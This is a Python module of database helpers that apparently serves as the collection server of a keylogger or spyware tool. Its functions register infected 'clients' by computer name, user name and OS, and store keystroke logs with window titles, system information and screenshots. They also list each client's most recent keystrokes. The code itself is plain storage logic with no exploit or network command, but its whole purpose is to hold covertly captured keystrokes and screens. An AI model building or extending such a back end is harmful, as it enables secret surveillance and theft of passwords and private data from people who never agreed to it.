from src.database.database import db
from src.database.models import Client, KeyLog, SystemInfo, Screenshot
from datetime import datetime

def get_or_create_client(client_id, computer_name=None, user_name=None, os_version=None):
    client = Client.query.get(client_id)
    if not client:
        client = Client(
            id=client_id,
            computer_name=computer_name,
            user_name=user_name,
            os_version=os_version
        )
        db.session.add(client)
    else:
        client.last_seen = datetime.utcnow()
        if computer_name:
            client.computer_name = computer_name
        if user_name:
            client.user_name = user_name
        if os_version:
            client.os_version = os_version
    
    db.session.commit()
    return client

def add_key_log(client_id, timestamp, window_title, key_data):
    key_log = KeyLog(
        client_id=client_id,
        timestamp=timestamp,
        window_title=window_title,
        key_data=key_data
    )
    db.session.add(key_log)
    db.session.commit()
    return key_log

def add_system_info(client_id, data):
    system_info = SystemInfo(
        client_id=client_id,
        data=data
    )
    db.session.add(system_info)
    db.session.commit()
    return system_info

def add_screenshot(client_id, image_data):
    screenshot = Screenshot(
        client_id=client_id,
        image_data=image_data
    )
    db.session.add(screenshot)
    db.session.commit()
    return screenshot

def get_client_logs(client_id, limit=100):
    return KeyLog.query.filter_by(client_id=client_id).order_by(
        KeyLog.timestamp.desc()
    ).limit(limit).all()

def get_all_clients():
    return Client.query.order_by(Client.last_seen.desc()).all()